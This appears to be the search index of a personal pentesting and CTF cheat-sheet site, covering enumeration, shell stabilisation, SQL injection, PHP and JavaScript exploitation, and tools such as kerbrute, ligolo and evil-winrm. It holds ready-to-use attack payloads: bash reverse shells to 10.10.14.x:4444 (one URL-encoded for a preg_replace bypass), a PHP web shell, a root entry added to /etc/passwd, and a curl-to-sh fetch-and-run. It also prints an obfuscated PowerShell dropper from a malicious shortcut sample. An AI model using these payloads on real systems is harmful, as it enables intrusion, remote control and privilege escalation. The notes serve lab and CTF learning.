{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home \ud83c\udfe0","text":""},{"location":"#about-me","title":"About me","text":"<p>My name is Jonathan. In the field of infrastructure, automation and cybersecurity, love to share knowledge and experiences.</p>"},{"location":"#blogs","title":"Blogs","text":"<ul> <li>simple-ctf ENG</li> <li>bashed ESP</li> <li>bank ESP</li> </ul>"},{"location":"#find-me-on","title":"Find me on","text":"<ul> <li>LinkedIn</li> <li>GitHub</li> <li>Links</li> </ul>"},{"location":"cloud/aws/","title":"AWS","text":"<p>AWS is a cloud provider, it offers a wide range of services.</p>"},{"location":"cloud/aws/#s3-bucket","title":"S3 Bucket","text":"<p>aws-cli</p> <p>Check for bucket without protection:</p> <pre><code>aws --endpoint=&lt;URL&gt; s3 ls\n</code></pre>"},{"location":"common/enumerate/","title":"Enumerate","text":"<p>Enumeration is the process of gathering information about a target. This can be done in a variety of ways, such as scanning for open ports, identifying services running on those ports, and identifying vulnerabilities in those services. The goal of enumeration is to gather as much information as possible about the target, so that you can identify potential attack vectors and plan your attack accordingly.</p>"},{"location":"common/enumerate/#inside-the-machine","title":"Inside the machine","text":"<p>A easy workaround is to use a script like <code>linpeas.sh</code> to enumerate the system. This script will gather information about the system and identify potential vulnerabilities that can be exploited.</p> <p>In our machine we do the following:</p> <pre><code>cd /tmp\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nsudo python3 -m http.server 8000\n</code></pre> <p>In the target machine we do the following:</p> <pre><code>wget http://&lt;your-ip&gt;:8000/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n</code></pre> <p>Similar in windows:</p> <pre><code>cd C:\\Users\\User\\Desktop\niwr -uri http://10.10.14.3/winpeas.exe -outfile winpeas.exe\n.\\winpeas.exe\n</code></pre>"},{"location":"common/enumerate/#outside-the-machine","title":"Outside the machine","text":"<p>If you are outside the machine, you can use tools like <code>nmap</code> to scan for open ports and identify services running on those ports. Once you have identified the services running on the target, you can use tools like <code>nmap</code> and <code>searchsploit</code> to identify potential vulnerabilities in those services.</p> <pre><code>nmap -p- -T4 --min-rate 5000 -sV -A -o bank &lt;IP&gt;\nnmap --script vuln -o vuln &lt;IP&gt;\ndirsearch -u http://bank.htb -e php -m GET directory_list_lowercase_2.3_medium.txt\nferoxbuster -u http://bank.htb -o ferox -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 401\nwhatweb &lt;IP&gt;\n</code></pre>"},{"location":"common/shell/","title":"Shell","text":""},{"location":"common/shell/#reverse-shell","title":"Reverse Shell","text":"<p>revshell is a website that provides reverse shell payloads for various programming languages.</p>"},{"location":"common/shell/#stability","title":"Stability","text":"<p>When you have a reverse shell, it is important to stabilize it. This is because the shell may be unstable and may not be able to run certain commands. You can stabilize the shell by running the following command.</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>script /dev/null -c bash\n</code></pre> <pre><code>CTRL+Z\nstty raw -echo; fg\n</code></pre> <pre><code>export TERM=xterm\nexport SHELL=bash\nstty rows 48 columns 170\n</code></pre>"},{"location":"common/wordlists/","title":"Wordlists","text":"<p>Wordlists are a collection of words that are used for brute-forcing, password cracking, and other security-related tasks. They are often used in combination with tools like <code>hydra</code>, <code>john</code>, and <code>hashcat</code>.</p> <ul> <li>SecLists</li> </ul>"},{"location":"common/writeable/","title":"Writeable Files","text":"<p>Here is common example of writeable files and their potential exploitation.</p> <pre><code>find / -type f -writable -exec ls -l {} \\; 2&gt;/dev/null\nfind / -perm -4000 -type f 2&gt;/dev/null\n</code></pre>"},{"location":"common/writeable/#etcpasswd","title":"/etc/passwd","text":"<p>In case you have write access to <code>/etc/passwd</code>, you can add a password to the root user and then login as root.</p> <pre><code>openssl passwd &lt;password&gt;\n# $1$eMFFC8pU$KCTHmfmr9jrJX.OoMl8wo1\n</code></pre> <p>Then add the password hash to the root user in <code>/etc/passwd</code>.</p> <pre><code>root:$1$eMFFC8pU$KCTHmfmr9jrJX.OoMl8wo1:0:0:root:/root:/bin/bash\"\n</code></pre> <p>Now we cann login as root with the password we set before.</p> <pre><code>su root\n</code></pre>"},{"location":"databases/mongodb/","title":"MongoDB","text":""},{"location":"databases/mongodb/#installation","title":"Installation","text":"<ul> <li>https://www.mongodb.com/try/download/shell</li> </ul>"},{"location":"databases/mongodb/#usage","title":"Usage","text":"<p>Connect to the mongodb with the IP and port <code>mongosh --host &lt;IP&gt;:27017</code></p> <p>Inside a machine you can use <code>mongo shell</code> to connect to the database.</p>"},{"location":"databases/mongodb/#basic-commands","title":"Basic commands","text":"<ul> <li><code>show dbs</code></li> <li><code>use &lt;db&gt;</code></li> <li><code>show collections</code></li> <li><code>db.&lt;collection&gt;.find()</code></li> </ul>"},{"location":"databases/sql/","title":"Sql","text":""},{"location":"databases/sql/#sql-injection","title":"SQL Injection","text":"<p>https://portswigger.net/web-security/sql-injection/cheat-sheet https://portswigger.net/web-security/sql-injection</p> <p>If there is a input field in a web page, you can try to inject SQL commands to the database.</p> <pre><code>' OR 1=1 --\n</code></pre> <pre><code>' UNION SELECT 1,2,3 --\n</code></pre>"},{"location":"databases/sql/#detect-mysql-port-and-version","title":"Detect MySQL Port and Version","text":"<pre><code>nmap -p- &lt;IP&gt; -oA fullport --min-rate=10000\nStarting Nmap 7.80 ( https://nmap.org ) at 2024-02-10 19:48 -03                      \nNmap scan report for 10.129.95.232 (10.129.95.232)                                   \nHost is up (0.20s latency).                                                          \nNot shown: 65534 closed ports                                                        \nPORT     STATE SERVICE\n3306/tcp open  mysql \n</code></pre> <pre><code>user in ~ \u03bb telnet 10.129.95.232 3306                                            \nTrying 10.129.95.232...                                                              \nConnected to 10.129.95.232.\nEscape character is '^]'.\n5.5.5-10.3.27-MariaDB-0+deb10u13\"f^#3toS-19h\"n\n</code></pre>"},{"location":"databases/sql/#connect-with-weak-credentials","title":"Connect with weak credentials","text":"<pre><code>mysql -h &lt;IP&gt; -u root\nmysql --host=localhost --user=myname --password=password mydb\n</code></pre>"},{"location":"databases/sql/#commannds","title":"Commannds","text":"<pre><code>SHOW DATABASES;\nuse &lt;DATABASE&gt;;\nSHOW TABLES;\n</code></pre>"},{"location":"hardware/unsquashfs/","title":"Unsquashfs","text":"<p>Unsquashfs is a tool that can extract files from a squashfs filesystem. It is part of the squashfs-tools package.</p>"},{"location":"hardware/unsquashfs/#usage","title":"Usage","text":"<p>To find if a file is a squashfs filesystem, use the <code>file</code> command.</p> <pre><code>file &lt;file&gt;\n</code></pre> <p>If we get the output as <code>Squashfs filesystem</code>, we can extract the contents of the filesystem using <code>unsquashfs</code> tool.</p> <pre><code>unsquashfs &lt;folder&gt; &lt;file&gt;\n</code></pre> <p>Then we can dig into the extracted folder to find the flag.</p> <pre><code>grep -r \"HTB\" &lt;folder&gt;\n</code></pre>"},{"location":"languages/javascript/","title":"Javascript","text":""},{"location":"languages/javascript/#eval","title":"Eval","text":"<p>The <code>eval</code> function is used to execute JavaScript code represented as a string. It is not recommended to use <code>eval</code> because it can introduce security vulnerabilities.</p> <pre><code>eval('console.log(\"Hello, World!\")');\n// Hello, World!\n</code></pre> <p>We could do something like</p> <pre><code>eval('require(\"fs\").readFileSync(\"/etc/passwd\").toString()');\n</code></pre>"},{"location":"languages/php/","title":"PHP","text":"<p>Common exploits in PHP.</p>"},{"location":"languages/php/#start-a-web-server","title":"Start a Web Server","text":"<p>php -S 127.0.0.1:8000</p>"},{"location":"languages/php/#cookies","title":"Cookies","text":"<p><code>PHPSESSID</code> is the default session cookie name.</p>"},{"location":"languages/php/#bypass-preg_replace","title":"Bypass preg_replace","text":"<p>If we now there is something like a word filter, there is probably a <code>preg_replace</code> function. We can try to bypass it sending something in the word that is being replaced.</p> <pre><code>swearwords%5B%2Fdick%2Fe%5D=%73%79%73%74%65%6d%28%22%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%31%30%2f%34%34%34%34%20%30%3e%26%31%27%22%29%3bto=test%40local.com&amp;subject=Test&amp;message=%3Cp%3Edick%3C%2Fp%3E%3Cp%3Ebitch%3Cbr%3E%3C%2Fp%3E\n</code></pre> <p>The payload is </p> <pre><code>system(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/4444 0&gt;&amp;1'\");\n</code></pre> <p>But URL encoded.</p>"},{"location":"languages/php/#web-shell","title":"Web shell","text":"<pre><code>&lt;?php system($_GET[\"cmd\"]); ?&gt;\n</code></pre>"},{"location":"languages/php/#reverse-shell","title":"Reverse shell","text":"<pre><code>&lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.11/4444 0&gt;&amp;1'\");?&gt;\n</code></pre>"},{"location":"languages/php/#examples","title":"Examples","text":"<pre><code>http://&lt;IP&gt;:45338/?format=${system($_GET[id])}&amp;id=cat%20../flag.txt\n</code></pre>"},{"location":"languages/python/","title":"Python","text":"<p>We can use Python for a variety of tasks, including:</p>"},{"location":"languages/python/#start-a-web-server","title":"Start a web server","text":"<pre><code>python3 -m http.server 8000\n</code></pre>"},{"location":"languages/python/#download-a-file-from-the-web-server","title":"Download a file from the web server","text":"<pre><code>wget http://&lt;IP&gt;:8000/file\n</code></pre>"},{"location":"languages/python/#execute-a-file-from-the-web-server","title":"Execute a file from the web server","text":"<pre><code>curl http://&lt;IP&gt;:8000/file | sh\n</code></pre>"},{"location":"languages/python/#monitor-a-file","title":"Monitor a file","text":"<p>We can use <code>pspy</code> to monitor a file.</p> <pre><code>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64\nchmod +x pspy64\n./pspy64 &lt;FILE&gt;\n</code></pre>"},{"location":"logs/emails/","title":"Emails","text":""},{"location":"logs/emails/#common-routes-to-found-email-logs","title":"Common routes to found email logs","text":"<pre><code>/var/log/maillog\n/var/log/mail.log\n/var/adm/maillog\n/var/adm/syslog/mail.log\n/var/mail/&lt;user&gt;\n</code></pre>"},{"location":"logs/sql/","title":"Sql","text":""},{"location":"logs/sql/#common-routes-to-found-sql-logs","title":"Common routes to found sql logs","text":"<pre><code>/var/opt/mssql/log/errorlog\n</code></pre>"},{"location":"networking/attacks/","title":"Networking Attacks","text":""},{"location":"networking/attacks/#syn-flood-attack","title":"SYN Flood Attack","text":"<p>A SYN flood attack is a form of denial-of-service attack in which an attacker sends a succession of SYN requests to a target's system in an attempt to consume enough server resources to make the system unresponsive to legitimate traffic.</p> <p></p> <p>In this example we see around 50k requests being sent to the server, which is a lot of requests for a server to handle. This is a SYN flood attack.</p>"},{"location":"networking/common/","title":"Techniques","text":""},{"location":"networking/common/#common","title":"Common","text":"<p><code>ifconfig</code> - show network interfaces <code>iwlist &lt;interface&gt; s</code> - scan the interface</p>"},{"location":"networking/common/#add-ip-to-interface","title":"Add IP to interface","text":"<p><code>ifconfig wlan0 192.168.1.200 netmask 255.255.255.0</code></p> <p>Where:</p> <ul> <li><code>wlan0</code> is the interface</li> <li><code>192.168.1</code> is the network and <code>200</code> is the IP. We have 254 IPs available</li> <li><code>255.255.255.0</code> is the netmask</li> </ul>"},{"location":"networking/common/#connect-to-a-network","title":"Connect to a network","text":"<p>If we want to connect to a network, we can use <code>wpa_supplicant</code>:</p> <pre><code>wpa_passphrase WLAN_NAME PASSWORD &gt; wpa_supplicant.conf\nwpa_supplicant -B -i wlan0 -c wpa_supplicant.conf\n</code></pre> <p>Where:</p> <ul> <li><code>WLAN_NAME</code> is the name of the network</li> <li><code>PASSWORD</code> is the password</li> <li><code>-B</code> runs in the background</li> </ul>"},{"location":"networking/common/#links","title":"Links","text":"<ul> <li>https://www.baeldung.com/linux/connect-network-cli</li> </ul>"},{"location":"reversing/checksec/","title":"Checksec","text":"<p>Checksec is a tool that can be used to check the security properties of a binary. It can be used to check for the presence of various security features such as NX, PIE, RELRO, and more.</p>"},{"location":"reversing/checksec/#usage","title":"Usage","text":"<pre><code>checksec --file=&lt;binary&gt;\n</code></pre>"},{"location":"reversing/checksec/#example","title":"Example","text":"<pre><code>checksec --file=behindthescenes\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nFull RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   73) Symbols       No    0               2               behindthescenes\n</code></pre>"},{"location":"reversing/cutter/","title":"Cutter","text":"<p>Cutter is a free and open-source reverse engineering platform powered by radare2. It is a graphical user interface for radare2, which is a command-line reverse engineering framework. Cutter is available for Windows, macOS, and Linux.</p>"},{"location":"reversing/cutter/#open-a-file","title":"Open a file","text":"<p>This way we can open a file in Cutter.</p> <p></p> <p>Once inside we can check the functions, strings, and other information about the binary.</p> <p></p> <p>To select the dissasembly mode check below.</p> <p></p> <p>This will show us a pseudo-code of the binary.</p>"},{"location":"reversing/gdb/","title":"GDB","text":"<p>GDB is a powerful debugger for C, C++, and other languages. It is a command-line debugger that allows you to inspect and modify the state of a program as it runs.</p>"},{"location":"reversing/gdb/#installation","title":"Installation","text":"<ul> <li>https://github.com/hugsy/gef</li> </ul>"},{"location":"reversing/gdb/#usage","title":"Usage","text":"<pre><code>gdb -q ./program\n</code></pre>"},{"location":"reversing/gdb/#create-a-pattern","title":"Create a pattern","text":"<pre><code>gef&gt; pattern create 100\n[+] Generating a pattern of 100 bytes (n=8)\naaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n[+] Saved as '$_gef0'\n</code></pre>"},{"location":"reversing/gdb/#use-a-pattern","title":"Use a pattern","text":"<pre><code>gef&gt; gef run $_gef0\n</code></pre> <p>Where:</p> <p><code>[#0] Id 1, Name: \"encrypt\", stopped 0x7ffff7e008f7 in __GI_fseek (), reason: SIGSEGV</code> is the location and function where the program crashed.</p>"},{"location":"reversing/gdb/#find-the-offset","title":"Find the offset","text":"<pre><code>gef&gt; pattern offset aaaaaaae\n[+] Searching 'aaaaaaae' in pattern of 100 bytes\n[+] Pattern 'aaaaaaae' first occurrence at position 36\n</code></pre>"},{"location":"scripting/bash/","title":"Bash","text":"<p>With bash we can create scripts that automate tasks.</p> <p>First we create a file withouth extension and add the following content:</p> <pre><code>#!/bin/bash\n\necho \"Hello, World!\"\n</code></pre> <p>Then we make the file executable:</p> <pre><code>chmod +x script\n</code></pre> <p>Finally we run the script:</p> <pre><code>./script\n</code></pre> <p>The output will be:</p> <pre><code>Hello, World!\n</code></pre> <p>If we want to make this executable from anywhere, we can move the file to a directory in the PATH:</p> <pre><code>sudo mv script /usr/local/bin\nscript\n</code></pre>"},{"location":"scripting/shc/","title":"SHC","text":"<p>Shell script compiler is a tool that compiles a script written in bash or sh to a binary file. This binary file can be executed on any system that has the same architecture as the system on which the script was compiled.</p>"},{"location":"scripting/shc/#installation","title":"Installation","text":""},{"location":"scripting/shc/#debianubuntu","title":"Debian/Ubuntu","text":"<pre><code>sudo add-apt-repository ppa:neurobin/ppa\nsudo apt-get update\nsudo apt-get install shc\n</code></pre>"},{"location":"scripting/shc/#usage","title":"Usage","text":"<pre><code>shc -f script.sh -o script\n</code></pre> <p>Where:</p> <ul> <li><code>-f</code> is the input file</li> <li><code>-o</code> is the output file</li> </ul> <p>After running the above command, a binary file named <code>script</code> will be created.</p> <p>We can execute the binary file as follows:</p> <pre><code>./script\n</code></pre> <p>Or better we could move the binary file to a directory in the PATH and execute it from anywhere.</p> <pre><code>sudo mv script /usr/local/bin\nscript\n</code></pre>"},{"location":"software/apachetomcatscanner/","title":"Apachetomcatscanner","text":"<p>Apachetomcatscanner is a tool that can be used to scan Apache Tomcat servers for vulnerabilities.</p>"},{"location":"software/apachetomcatscanner/#usage","title":"Usage","text":"<pre><code>apachetomcatscanner -h\n</code></pre> <pre><code>apachetomcatscanner -tt &lt;target-ip&gt; -tp &lt;target-port&gt;\napachetomcatscanner -tt &lt;target-ip&gt; -tp - ## All ports\napachetomcatscanner -tt &lt;target-ip&gt; -tp - --list-cves ## List possible CVEs on all ports\n</code></pre>"},{"location":"software/burp/","title":"Burp Suite","text":"<p>Burp Suite is a set of tools for web application security testing.</p> <p>First and foremost, use the button <code>open browser</code> to open a browser that is configured to use Burp Suite as a proxy.</p>"},{"location":"software/burp/#decoder","title":"Decoder","text":"<p>Decoder is a tool that can be used to decode/encode data. It is a very useful tool for web application security testing.</p> <p></p> <p>In this example we encoded a string into base64.</p>"},{"location":"software/burp/#repeater","title":"Repeater","text":"<p>Repeater is a tool that can be used to repeat requests. Specially usefull when want to do crafted payloads.</p> <p></p> <p>While you are here, you can click on a request then CTRL+R to send it to the repeater. or second click on the request and select <code>Send to Repeater</code>.</p> <p></p> <p>And here we can modify the request and send it again.</p>"},{"location":"software/burp/#proxy","title":"Proxy","text":""},{"location":"software/burp/#intercept","title":"Intercept","text":"<p>We can use the intercept to capture requests and save them to a file.</p> <p> </p> <p>Here if we do right click and press <code>Copy to file</code> we can save the request to a file.                                       </p>"},{"location":"software/curl/","title":"Curl","text":"<p>curl is a command line tool to transfer data to or from a server.</p>"},{"location":"software/curl/#send-a-request-with-payload","title":"Send a request with payload","text":"<pre><code>curl -X POST http://example.com -d '{\"data\": \"value\"}'\n</code></pre>"},{"location":"software/curl/#escape-characters","title":"Escape characters","text":"<pre><code>curl -X POST http://example.com -d '{\\\"data\\\": \\\"value\\\"}'\n</code></pre>"},{"location":"software/curl/#send-url-encoded-data","title":"Send URL encoded data","text":"<pre><code>curl -X POST http://example.com --data-urlencode 'data=value'\n</code></pre>"},{"location":"software/curl/#multi-line-command","title":"Multi line command","text":"<pre><code>curl -X POST http://example.com \\\n-d '{\\\"data\\\": \\\"value\\\"}' \\\n-H 'Content-Type: application/json' \\\n| jq\n</code></pre>"},{"location":"software/depix/","title":"Depix","text":"<p>Depix is a tool for recovering passwords from pixelized screenshots. This implementation works on pixelized images that were created with a linear box filter.</p>"},{"location":"software/depix/#usage","title":"Usage","text":"<ol> <li>First, we need to extract the individual characters from the screenshots. We can do this by running the following command:</li> </ol> <pre><code>pdfimages &lt;pdf-file&gt; &lt;output-file&gt;\n</code></pre> <ol> <li>Next, we can use the Depix tool to recover the password. We need to specify the pixelized image, as well as the reference image that contains the characters we are looking for. We can do this by running the following command:</li> </ol> <pre><code>python3 depix.py -p &lt;pixelized-image&gt;.ppm -s &lt;reference-image&gt;\npython3 depix.py -p sample-000.ppm -s searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png\n</code></pre>"},{"location":"software/evil-winrm/","title":"Evil Win-RM","text":"<p>Evil-WinRM is the ultimate WinRM shell for hacking/pentesting.</p>"},{"location":"software/evil-winrm/#installation","title":"Installation","text":"<pre><code>gem install evil-winrm\n</code></pre>"},{"location":"software/evil-winrm/#run-with-docker","title":"Run with Docker","text":"<pre><code>docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/ps1_scripts/' -e '/exe_files/'\n</code></pre>"},{"location":"software/exiftool/","title":"Exiftool","text":"<p>Exiftool is a command line tool that can be used to read, write and edit metadata in a wide variety of file types. It is a powerful tool that can be used to extract metadata from files, edit metadata, and even remove metadata from files.</p>"},{"location":"software/exiftool/#usage","title":"Usage","text":"<pre><code>exiftool FILE\nexiftool $HOME/Documents/Proyectos/hack-the-box/machines/mailing/files/johnsmith.jpg \nExifTool Version Number         : 12.84\nFile Name                       : johnsmith.jpg\nDirectory                       : /home/dyallo/Documents/Proyectos/hack-the-box/machines/mailing/files\nFile Size                       : 6.1 MB\nFile Modification Date/Time     : 2024:05:04 16:33:23-03:00\nFile Access Date/Time           : 2024:05:04 16:33:40-03:00\nFile Inode Change Date/Time     : 2024:05:04 16:33:23-03:00\nFile Permissions                : -rw-rw-r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nResolution Unit                 : inches\nX Resolution                    : 300\nY Resolution                    : 300\nCurrent IPTC Digest             : 3c7a879125ea0496f5cea9aef811043c\nOriginal Transmission Reference : 53616c7465645f5fab215e637899d0ac560d2732d50efff408eed2760d4cc9c5b0fcecde64aa349b\nApplication Record Version      : 4\nImage Width                     : 4704\nImage Height                    : 2823\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)\nImage Size                      : 4704x2823\nMegapixels                      : 13.3\n</code></pre>"},{"location":"software/git-dumper/","title":"Git Dumper","text":"<p>git-dumper is a tool to dump a git repository to a directory. It is useful when you want to extract a git repository when is exposed in a web server.</p>"},{"location":"software/git-dumper/#usage","title":"Usage","text":"<pre><code>git-dumper http://pilgrimage.htb/.git repository\n</code></pre>"},{"location":"software/joomscan/","title":"Joomscan","text":"<p>Joomscan is a tool used to scan Joomla websites for vulnerabilities.</p>"},{"location":"software/joomscan/#usage","title":"Usage","text":"<pre><code>joomscan -u http://10.10.11.3 \n    ____  _____  _____  __  __  ___   ___    __    _  _ \n   (_  _)(  _  )(  _  )(  \\/  )/ __) / __)  /__\\  ( \\( )\n  .-_)(   )(_)(  )(_)(  )    ( \\__ \\( (__  /(__)\\  )  ( \n  \\____) (_____)(_____)(_/\\/\\_)(___/ \\___)(__)(__)(_)\\_)\n            (1337.today)\n\n    --=[OWASP JoomScan\n    +---++---==[Version : 0.0.7\n    +---++---==[Update Date : [2018/09/23]\n    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo\n    --=[Code name : Self Challenge\n    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP\n\nProcessing http://10.10.11.3 ...\n\n\n\n[+] FireWall Detector\n[++] Firewall not detected\n\n[+] Detecting Joomla Version\n[++] Joomla 4.2.7\n\n[+] Core Joomla Vulnerability\n[++] Target Joomla core is not vulnerable\n\n[+] Checking Directory Listing\n[++] directory has directory listing : \nhttp://10.10.11.3/administrator/components\nhttp://10.10.11.3/administrator/modules\nhttp://10.10.11.3/administrator/templates\nhttp://10.10.11.3/images/banners\n\n\n[+] Checking apache info/status files\n[++] Readable info/status files are not found\n\n[+] admin finder\n[++] Admin page : http://10.10.11.3/administrator/\n\n[+] Checking robots.txt existing\n[++] robots.txt is found\npath : http://10.10.11.3/robots.txt \n\nInteresting path found from robots.txt\nhttp://10.10.11.3/joomla/administrator/\nhttp://10.10.11.3/administrator/\nhttp://10.10.11.3/api/\nhttp://10.10.11.3/bin/\nhttp://10.10.11.3/cache/\nhttp://10.10.11.3/cli/\nhttp://10.10.11.3/components/\nhttp://10.10.11.3/includes/\nhttp://10.10.11.3/installation/\nhttp://10.10.11.3/language/\nhttp://10.10.11.3/layouts/\nhttp://10.10.11.3/libraries/\nhttp://10.10.11.3/logs/\nhttp://10.10.11.3/modules/\nhttp://10.10.11.3/plugins/\nhttp://10.10.11.3/tmp/\n\n\n[+] Finding common backup files name\n[++] Backup files are not found\n\n[+] Finding common log files name\n[++] error log is not found\n\n[+] Checking sensitive config.php.x file\n[++] Readable config files are not found\n</code></pre>"},{"location":"software/keepass/","title":"Keepass","text":"<p>Keepass is a password manager that stores passwords in a single encrypted file. It is a good idea to use a password manager to store passwords, as it allows for the use of long, complex passwords that are unique to each service.</p>"},{"location":"software/keepass/#dumping-keepass-passwords","title":"Dumping KeePass Passwords","text":"<p>Requirements</p> <p><code>.dmp</code> file</p> <p>dump-password</p>"},{"location":"software/keepass/#opening-keepass-database","title":"Opening KeePass Database","text":"<pre><code>keepassxc-cli open --key-file New.key New.kdbx\npress enter\nls\nshow -s &lt;file&gt;\n</code></pre>"},{"location":"software/kerbrute/","title":"Kerbrute","text":"<p>Kerbrute is a tool to perform Kerberos pre-auth bruteforcing. It is a tool that can be used to enumerate valid usernames on a domain using the Kerberos protocol.</p>"},{"location":"software/kerbrute/#usage","title":"Usage","text":"<pre><code>kerbrute userenum -d &lt;target&gt; --dc &lt;ip&gt; &lt;wordlist&gt;\nkerbrute userenum -d office.htb --dc 10.10.11.3 ~/Documents/Security/wordlists/jsmith.txt\n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 03/25/24 - Ronnie Flathers @ropnop\n\n2024/03/25 21:55:44 &gt;  Using KDC(s):\n2024/03/25 21:55:44 &gt;   10.10.11.3:88\n\n2024/03/25 21:56:07 &gt;  [+] VALID USERNAME:       ewhite@office.htb\n2024/03/25 21:57:32 &gt;  [+] VALID USERNAME:       dmichael@office.htb\n2024/03/25 21:57:43 &gt;  [+] VALID USERNAME:       dwolfe@office.htb\n2024/03/25 21:58:11 &gt;  [+] VALID USERNAME:       tstark@office.htb\n2024/03/25 21:58:11 &gt;  [+] VALID USERNAME:       hhogan@office.htb\n2024/03/25 21:58:11 &gt;  [+] VALID USERNAME:       ppotts@office.htb\n2024/03/25 22:10:21 &gt;  Done! Tested 48705 usernames (6 valid) in 876.820 seconds\n</code></pre>"},{"location":"software/ligolo/","title":"Ligolo","text":"<p>Traffic networking tool</p>"},{"location":"software/ligolo/#usage","title":"Usage","text":"<p>Attacker machine</p> <pre><code>ligon #Custom Alias\nsudo ./proxy --selfcert\nWARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!\nWARN[0000] Using self-signed certificates\nINFO[0000] Listening on 0.0.0.0:&lt;PORT&gt;\n</code></pre> <p>Target machine</p> <pre><code>./agent -connect ATTACKER_IP:&lt;PORT&gt; -ignore-cert\nWARN[0000] warning, certificate validation disabled\nINFO[0000] Connection established \n</code></pre> <p>Once we good a connection in the proxy server we execute</p> <pre><code>ligolo-ng \u00bb session\n? Specify a session : 1 - root@casino - ... - ...\n[Agent : root@casino] \u00bb start\nINFO[0101] Starting tunnel to root@casino\n</code></pre> <p>And in the end we do <code>sudo ip route add ... dev ligolo</code></p> <p>Now we should be able to connect to internal route that is going through the target machine</p>"},{"location":"software/lnkparse/","title":"LnkParse3","text":"<p>Is a Windows link parser.</p> <pre><code>lnkparse trick_or_treat.lnk\nWindows Shortcut Information:\n   Link CLSID: 00021401-0000-0000-C000-000000000046\n   Link Flags: HasTargetIDList | HasName | HasRelativePath | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16621)\n   File Flags:  - (0)\n\n   Creation Timestamp: None\n   Modified Timestamp: None\n   Accessed Timestamp: None\n\n   Icon Index: 70 \n   Window Style: SW_SHOWMINNOACTIVE \n   HotKey: CONTROL - C {0x4302} \n\n   TARGETS:\n      Index: 78\n      ITEMS:\n         Root Folder\n            Sort index: My Computer\n            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D\n         Volume Item\n            Flags: 0xf\n            Data: None\n         File entry\n            Flags: Is directory\n            Modification time: None\n            File attribute flags: 16\n            Primary name: Windows\n         File entry\n            Flags: Is directory\n            Modification time: None\n            File attribute flags: 16\n            Primary name: System32\n         File entry\n            Flags: Is directory\n            Modification time: None\n            File attribute flags: 16\n            Primary name: WindowsPowerShell\n         File entry\n            Flags: Is directory\n            Modification time: None\n            File attribute flags: 16\n            Primary name: v1.0\n         File entry\n            Flags: Is file\n            Modification time: None\n            File attribute flags: 0\n            Primary name: powershell.exe\n\n   DATA\n      Description: Trick or treat\n      Relative path: ..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n      Command line arguments: -WindowStyle hidden -NoExit -Command \"$fko = 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=';$dwQWf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko));Invoke-Expression -Command $dwQWf\"9%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe\n      Icon location: C:\\Windows\\System32\\shell32.dll\n\n   EXTRA BLOCKS:\n      ICON_LOCATION_BLOCK\n         Target ansi: %SystemRoot%\\System32\\shell32.dll\n         Target unicode: %SystemRoot%\\System32\\shell32.dll\n      SPECIAL_FOLDER_LOCATION_BLOCK\n         Special folder id: 37\n      KNOWN_FOLDER_LOCATION_BLOCK\n         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7\n      METADATA_PROPERTIES_BLOCK\n         Property store:\n            Storage:\n               Version: 0x53505331\n               Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE\n               Serialized property values:\n                  Property:\n                     Id: 4\n                     Value: S-1-5-21-3849600975-1564034632-632203374-1001\n                     Value type: VT_LPWSTR\n</code></pre>"},{"location":"software/lnkparse/#links","title":"Links","text":"<ul> <li>https://github.com/Matmaus/LnkParse3</li> 